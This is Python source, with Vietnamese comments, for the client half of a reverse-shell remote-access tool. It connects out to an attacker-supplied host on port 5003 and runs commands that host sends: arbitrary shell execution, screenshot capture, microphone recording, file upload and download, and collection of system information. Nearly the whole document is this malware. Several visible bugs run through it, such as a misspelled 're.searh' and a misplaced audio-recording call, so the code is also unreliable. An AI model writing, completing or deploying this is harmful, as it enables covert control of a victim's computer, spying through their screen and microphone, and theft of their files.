import socket , os , subprocess , sys , re , platform , tqdm 
# platform : lấy thông tin về hệ thống 
from datetime import datetime
try:
    import pyautogui # dùng cho screenshot 
except KeyError:
    # nếu một vài máy không có màn hình - như server thì không cần import pyautogui
    pyautogui_imported = False
else:
    pyautogui_imported = True

import sounddevice as sd  # dùng để ghi âm 
from tabulate import tabulate # dùng để hiển thị bảng
from scipy.io import wavfile  # lưu recorded audio thành file wav
import psutil , GPUtil  # dùng để lấy thông tin về CPU và GPU 

SERVER_HOST = sys.argv[1]
SERVER_PORT = 5003 
BUFFER_SIZE = 1140 
SEPERATOR = "<sep>"

class Client :
    def __init__ (self , host , port , verbose = False) : 
        self.host = host 
        self.port = port
        self.verbose = verbose
        # kết nối đến server 
        self.socket = self.connect_to_server()
        # thư mục hiện tại 
        self.cwd = None 
    def connect_to_server(self , custom_port = None) : 
        s = socket.socket()
        if custom_port :
            port = custom_port
        else :  
            port = self.port
        if self.verbose :
            print(f"[*] Connecting to {self.host}:{port}")
        s.connect((self.host , port))
        if self.verbose :
            print("[+] Connected.")
        return s 
    def start(self) :
        self.cwd = os.getcwd()
        self.socket.send(self.cwd.encode())
        while True : 
            # nhận lệnh từ server 
            command = self.socket.recv(BUFFER_SIZE).decode()
            output = self.handle_command(command)
            if output == "abort" : 
                    break # nếu là abort thì thoát khỏi vòng lặp 
            elif output in ["exit" , "quit"] : 
                continue
            self.cwd = os.getcwd()
            # gửi dữ liệu lại cho server 
            message = f"{output}{SEPERATOR}{self.cwd}" 
            self.socket.sendall(message.encode())
        # đóng kết nối
        self.socket.close()
    def handle_command(self , command)  :
        if self.verbose :
            print(f"[+] Executing command: {command}")
        if command.lower() in ["exit" , "quit"] : # không làm gì cả vì server đã xử lý
            output = "exit"
        elif command.lower() == "abort" : 
            output = "abort"
        elif (match := re.search(r"cd\s*(.*)" , command)) : # bắt lấy tất cả nội dung phía sau cd 
            output = self.change_directory(match.group(1))
        elif (match := re.search(r"screenshot\s*(\w*)" , command)) :  # bắt lấy tất cả chữ cái và dấu gạch dưới sau screenshot
            # chụp màn hình và lưu nó vào file 
            if pyautogui_imported :
                output = self.take_screenshot(match.group(1))
            else :
                output = "Display is not supported in this machine" 
        elif (match := re.search(r"recordmic\s*([a-zA-Z0-9]*)(\.[a-zA-Z]*)\s*(\d*)" , command)) :
          # \s* : cho phép khoẳng trắng 
          # [a-zA-Z0-9]* : cho phép phần tên chỉ có chữ cái và số không có dấu . 
          # (\.[a-zA-Z]*) : bắt phần mở rộng file , bắt đầu bằng dấu . và theo sau chữ cái 
          # \d* : bắt số lượng giây ghi âm - chỉ gồm số 
          audio_filename = match.group(1) + match.group(2)
          try :
              seconds = int(match.group(3))
          except  ValueError:
             # nếu giây không được nhập thì ghi âm tối đa 5 giây 
             seconds = 5
             output = self.record_audio(audio_filename , seconds = seconds )
        elif (match := re.searh(r"download\s*(.*)" , command)) :
            filename = match.group(1)
            if os.path.isfile(filename) :
                output = f"[+] The file {filename} is sent"
                self.sendfile(filename)
            else :
                output = f"[-] The file {filename} does not exist"
        elif (match := re.search(r"upload\s*(.*)" , command)) :
            filename = match.group(1)
            output = f"[+] The file {filename} is received"
            self.receive_file()
        # sysinfo 
        elif (match := re.search(r"sysinfo.*" , command)) : 
            output = Client.get_sys_hardware_info()
        # nếu không có lệnh tùy chỉnh nào thì chạy lệnh thông thường 
        else :
            output = subprocess.getoutput(command)
        return output 